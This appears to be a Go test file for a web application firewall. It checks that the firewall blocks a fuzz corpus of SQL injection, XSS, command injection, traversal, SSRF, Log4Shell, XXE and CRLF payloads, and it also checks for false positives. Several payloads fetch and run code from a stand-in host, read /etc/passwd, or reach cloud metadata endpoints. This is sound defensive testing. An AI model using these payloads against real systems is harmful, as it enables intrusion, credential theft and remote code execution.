package engine

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/config"
	"wewaf/internal/core"
	"wewaf/internal/rules"
)

// newFuzzEngine builds an engine with the full default + CRS rule set in
// active mode, mirroring a realistic deployment. Rule matching is exercised
// directly (no proxy), so rate-limiting / DDoS gates can't pollute results.
func newFuzzEngine(t testing.TB) *Engine {
	t.Helper()
	cfg := config.Default()
	cfg.Mode = "active"
	if err := cfg.Validate(); err != nil {
		t.Fatalf("config validate: %v", err)
	}
	raw := rules.DefaultRules()
	raw = append(raw, rules.CRSRules()...)
	rs, err := rules.NewRuleSet(raw)
	if err != nil {
		t.Fatalf("NewRuleSet: %v", err)
	}
	eng, err := NewEngine(cfg, rs, nil)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	return eng
}

// blockedInArg runs the payload as a query-string arg through the header
// phase (which canonicalizes args/uri exactly like the proxy does).
func blockedInArg(eng *Engine, payload string) bool {
	u := "/probe?x=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodGet, u, nil)
	tx := core.NewTransaction(nil, req, nil)
	return eng.ProcessRequestHeaders(tx) != nil
}

// blockedInFormBody runs the payload as a urlencoded form field through the
// body phase.
func blockedInFormBody(eng *Engine, payload string) bool {
	form := "x=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodPost, "/probe", strings.NewReader(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(form))
	return eng.ProcessRequestBody(tx) != nil
}

// blockedInRawBody runs the payload as a raw text body through the body phase.
func blockedInRawBody(eng *Engine, payload string) bool {
	req := httptest.NewRequest(http.MethodPost, "/probe", strings.NewReader(payload))
	req.Header.Set("Content-Type", "text/plain")
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(payload))
	return eng.ProcessRequestBody(tx) != nil
}

type fuzzAttack struct {
	class   string
	payload string
}

func fuzzCorpus() []fuzzAttack {
	return []fuzzAttack{
		// --- SQLi (incl. evasions) ---
		{"sqli", "1 UNION SELECT username,password FROM users"},
		{"sqli", "1 UNION/**/SELECT/**/1,2,3"},
		{"sqli", "1 UNION ALL SELECT NULL--"},
		{"sqli", "1 UnIoN sElEcT 1,2"},
		{"sqli", "1' OR '1'='1"},
		{"sqli", "1' OR 1=1-- -"},
		{"sqli", "admin'--"},
		{"sqli", "1; DROP TABLE users"},
		{"sqli", "1 AND SLEEP(5)"},
		{"sqli", "1' AND extractvalue(1,concat(0x7e,version()))-- -"},
		{"sqli", "/*!50000UNION*//*!50000SELECT*/1"},

		// --- XSS (incl. evasions) ---
		{"xss", "<script>alert(1)</script>"},
		{"xss", "<ScRiPt>alert(1)</ScRiPt>"},
		{"xss", "<img src=x onerror=alert(1)>"},
		{"xss", "<svg onload=alert(1)>"},
		{"xss", "<svg/onload=alert(1)>"},
		{"xss", "<img/src=x/onerror=alert(1)>"},
		{"xss", "<body onload=alert(1)>"},
		{"xss", "<iframe src=javascript:alert(1)>"},
		{"xss", "<a href=\"javascript:alert(1)\">x</a>"},
		{"xss", "<details open ontoggle=alert(1)>"},
		{"xss", "<input autofocus onfocus=alert(1)>"},
		{"xss", "<marquee onstart=alert(1)>"},
		{"xss", "<script\nsrc=//evil.com/x.js></script>"},
		{"xss", "javascript:alert(document.cookie)"},

		// --- RCE / command injection ---
		{"rce", "$(whoami)"},
		{"rce", "`id`"},
		{"rce", ";cat /etc/passwd"},
		{"rce", "| id"},
		{"rce", "&& whoami"},
		{"rce", ";id;"},
		{"rce", "; ls -la /"},
		{"rce", "$(curl http://evil.com/x|bash)"},
		{"rce", "cat${IFS}/etc/passwd"},
		{"rce", "; ping -c 1 evil.com"},

		// --- Path traversal / LFI ---
		{"traversal", "../../../etc/passwd"},
		{"traversal", "..%2f..%2f..%2fetc%2fpasswd"},
		{"traversal", "....//....//etc/passwd"},
		{"traversal", "..%252f..%252fetc%252fpasswd"},
		{"traversal", "/etc/passwd"},
		{"traversal", "/proc/self/environ"},
		{"traversal", "php://filter/convert.base64-encode/resource=index.php"},

		// --- SSTI ---
		{"ssti", "{{7*7}}"},
		{"ssti", "{{config.items()}}"},
		{"ssti", "${7*7}"},
		{"ssti", "{{''.__class__.__mro__[1].__subclasses__()}}"},
		{"ssti", "#{7*7}"},

		// --- SSRF ---
		{"ssrf", "http://169.254.169.254/latest/meta-data/"},
		{"ssrf", "http://127.0.0.1:8080/admin"},
		{"ssrf", "gopher://127.0.0.1:6379/_INFO"},
		{"ssrf", "file:///etc/passwd"},

		// --- NoSQL ---
		{"nosql", "{\"$gt\":\"\"}"},
		{"nosql", "{\"username\":{\"$ne\":null}}"},

		// --- Log4Shell ---
		{"log4j", "${jndi:ldap://evil.com/a}"},
		{"log4j", "${${lower:j}ndi:ldap://evil.com/a}"},

		// --- Encoding / obfuscation evasions ---
		{"sqli", "1'/**/OR/**/'1'='1"},
		{"sqli", "1 || 1=1"},
		{"sqli", "1 AND 1=1"},
		{"xss", "%3Cscript%3Ealert(1)%3C/script%3E"},
		{"xss", "%253Cscript%253Ealert(1)%253C/script%253E"},
		{"xss", "jaVAscRipt:alert(1)"},
		{"xss", "<a href=jAvAsCrIpT:alert(1)>x</a>"},
		{"xss", "<svg><script>alert(1)</script></svg>"},
		{"xss", "<img src=`x` onerror=alert(1)>"},
		{"traversal", "..\\..\\..\\windows\\win.ini"},
		{"traversal", "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"},
		{"traversal", "..%c0%af..%c0%afetc%c0%afpasswd"},
		{"rce", "cat$IFS$9/etc/passwd"},
		{"rce", ";id"},
		{"rce", "|whoami"},
		{"ssrf", "http://0x7f000001/"},
		{"ssrf", "http://2130706433/"},
		{"ssrf", "http://[::1]/admin"},
		{"xxe", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
		{"crlf", "foo\r\nSet-Cookie: sessionid=evil"},
		{"crlf", "foo%0d%0aSet-Cookie:%20x=1"},
	}
}

// detectOnly lists payloads we intentionally detect (log) but do not block,
// because a blocking rule would be too false-positive-prone. They must still
// produce at least one rule match.
var detectOnly = map[string]bool{
	"#{7*7}": true, // Ruby/JSP interpolation canary; dangerous variants block via EL-001
}

// detectedInAnyPlacement reports whether the payload produced at least one
// rule match (block OR log) in any placement.
func detectedInAnyPlacement(eng *Engine, payload string) bool {
	for _, build := range []func(string) *core.Transaction{
		func(p string) *core.Transaction {
			req := httptest.NewRequest(http.MethodGet, "/probe?x="+url.QueryEscape(p), nil)
			tx := core.NewTransaction(nil, req, nil)
			eng.ProcessRequestHeaders(tx)
			return tx
		},
		func(p string) *core.Transaction {
			form := "x=" + url.QueryEscape(p)
			req := httptest.NewRequest(http.MethodPost, "/probe", strings.NewReader(form))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			tx := core.NewTransaction(nil, req, nil)
			tx.SetMetadata("body", []byte(form))
			eng.ProcessRequestBody(tx)
			return tx
		},
	} {
		if build(payload).MatchCount() > 0 {
			return true
		}
	}
	return false
}

// TestCorpusAllBlocked is the regression guard: every payload in the corpus
// must be blocked in at least one placement (arg / form-body / raw-body),
// except those on the detect-only allowlist, which must still be detected.
// New bypasses found by the exploratory report below should be promoted here.
func TestCorpusAllBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	for _, a := range fuzzCorpus() {
		a := a
		t.Run(a.class+"_"+a.payload, func(t *testing.T) {
			blocked := blockedInArg(eng, a.payload) ||
				blockedInFormBody(eng, a.payload) ||
				blockedInRawBody(eng, a.payload)
			if detectOnly[a.payload] {
				if blocked {
					return // blocking is fine too
				}
				if !detectedInAnyPlacement(eng, a.payload) {
					t.Errorf("detect-only payload not even detected: %q", a.payload)
				}
				return
			}
			if !blocked {
				t.Errorf("payload bypassed all placements: [%s] %q", a.class, a.payload)
			}
		})
	}
}

// TestSSRFQueryStringBlocked asserts that SSRF payloads delivered in a GET
// query parameter are blocked at the header phase. The body-phase SSRF rules
// list "args" as a target but never see query-string args, so this guards the
// header-phase coverage (SSRF-008/010/011/012) against regression.
func TestSSRFQueryStringBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	payloads := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://127.0.0.1:8080/admin",
		"http://192.168.1.1/",
		"http://10.0.0.5/internal",
		"http://172.16.0.1/",
		"gopher://127.0.0.1:6379/_INFO",
		"dict://127.0.0.1:11211/stats",
		"http://169.254.170.2/v2/credentials",
		"http://[::1]/admin",
		"http://2130706433/",
		"/latest/meta-data/iam/security-credentials/",
		"/metadata/instance?api-version=2021-02-01",
	}
	for _, p := range payloads {
		p := p
		t.Run(p, func(t *testing.T) {
			if !blockedInArg(eng, p) {
				t.Errorf("query-string SSRF not blocked at header phase: %q", p)
			}
		})
	}
}

// TestSSRFQueryStringNoFalsePositive confirms the header-phase SSRF rules do
// not fire on legitimate query strings (public URLs/IPs, ordinary params).
func TestSSRFQueryStringNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	legit := []string{
		"https://app.example.com/dashboard",
		"https://cdn.example.org/assets/logo.png",
		"8.8.8.8",
		"203.0.113.42",
		"us-east-1",
		"2021-02-01",
		"/account/settings",
		"order_12345678",
	}
	for _, p := range legit {
		p := p
		t.Run(p, func(t *testing.T) {
			if blockedInArg(eng, p) {
				t.Errorf("legitimate query param wrongly blocked as SSRF: %q", p)
			}
		})
	}
}

// ANY placement so new evasions surface during development. It never fails.
func TestFuzzCorpusReport(t *testing.T) {
	eng := newFuzzEngine(t)
	var misses []string
	for _, a := range fuzzCorpus() {
		arg := blockedInArg(eng, a.payload)
		form := blockedInFormBody(eng, a.payload)
		raw := blockedInRawBody(eng, a.payload)
		if !arg && !form && !raw {
			misses = append(misses, fmt.Sprintf("[%-9s] arg=%v form=%v raw=%v  %q",
				a.class, arg, form, raw, a.payload))
		}
	}
	if len(misses) == 0 {
		t.Logf("no full bypasses: every payload blocked in at least one placement")
		return
	}
	t.Logf("=== %d payloads NOT blocked in ANY placement (detect-only allowed) ===", len(misses))
	for _, m := range misses {
		t.Logf("%s", m)
	}
}
